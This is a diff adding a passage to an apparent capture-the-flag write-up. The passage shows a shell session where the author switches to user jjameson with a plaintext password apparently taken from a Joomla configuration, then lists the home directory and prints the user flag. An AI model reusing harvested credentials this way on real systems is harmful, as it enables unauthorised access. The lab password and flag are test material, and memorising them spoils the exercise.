@@ -352,6 +352,42 @@ class JConfig {
 
 ![image](https://github.com/user-attachments/assets/54f3164c-19e5-4ad7-8442-5e0c2d8ff638)
 
+<pre><code>sh-4.2$ su jjameson 
+su jjameson
+Password: nv5uz9r3ZEDzVjNu
+whoami 
+jjameson
+pwd
+/home
+ls
+jjameson
+ls -la
+total 0
+drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
+dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
+drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
+ls -la jjameson
+total 16
+drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
+drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
+lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
+-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
+-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
+-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
+cd jjameson
+ls
+user.txt
+cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+
+</code></pre>
+
+<br>
+
+
+
+<p>----------- To be continued -----------</p>
 
 
 
